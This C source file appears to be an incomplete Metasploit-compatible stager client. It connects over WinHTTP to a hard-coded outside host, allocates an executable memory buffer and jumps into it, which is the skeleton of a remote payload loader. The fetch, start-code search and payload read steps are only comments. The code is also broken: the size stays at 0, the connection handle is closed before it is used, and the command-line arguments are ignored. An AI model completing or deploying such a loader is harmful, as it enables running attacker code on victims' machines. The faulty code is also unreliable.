/*
 * A C-based stager client compat with the Metasploit Framework
 *    based on a discussion on the Metasploit Framework mailing list
 *
 * Sends an HTTP request to the designated host, searches for a startcode
 *    in the response, then reads in a length specifier, then n bytes of
 *    data (where n was determined by the length specifier).
 *
 * @author Dakota Nelson (dakota.w.nelson@gmail.com)
 *  based on a stager by Raphael Mudge (raffi@strategiccyber.com)
 *  Original code available at https://github.com/rsmudge/metasploit-loader
 * @license BSD License.
 *
 * Relevant messages:
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008660.html
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>

/* set up winhttp */
HINTERNET winhttp_init() {
  /* see:
   * msdn.microsoft.com/en-us/library/windows/desktop/aa384098(v=vs.85).aspx 
   * */
  HINTERNET internet;
  LPCWSTR userAgent = L"Test User Agent";
  DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;

  /* userAgent is optional */
  internet = WinHttpOpen(userAgent,
                         accessType,
                         WINHTTP_NO_PROXY_NAME,
                         WINHTTP_NO_PROXY_BYPASS,
                         0);

  return internet;
}

/* a quick routine to quit and report why we quit */
void punt(HINTERNET internet, char * error) {
  printf("Bad things: %s\n", error);
  WinHttpCloseHandle(internet);
  WSACleanup();
  exit(1);
}

int main(int argc, char * argv[]) {
  ULONG32 size;
  char * buffer;
  void (*function)();
  HINTERNET internet, target;

  internet = winhttp_init();

  WinHttpCloseHandle(internet);

  if (argc != 3) {
    printf("%s [host] [port]\n", argv[0]);
    exit(1);
  }
  /* connect to target host */

  LPCWSTR host = L"twitter.com";
  target = WinHttpConnect(internet, host, INTERNET_DEFAULT_PORT, 0);

  /* send HTTP GET to target host */

  /* search for start code in returned text */

  /* read length immediately after start code */
  size = 0;

  /* read <length> characters, perhaps b64 decode? then treat as code */

  /* allocate a RWX buffer */
  buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (buffer == NULL)
    punt(internet, "could not allocate buffer\n");

  /* toss our newly found code into the buffer */

  /* cast our buffer as a function and call it */
  function = (void (*)())buffer;
  function();

  return 0;
}

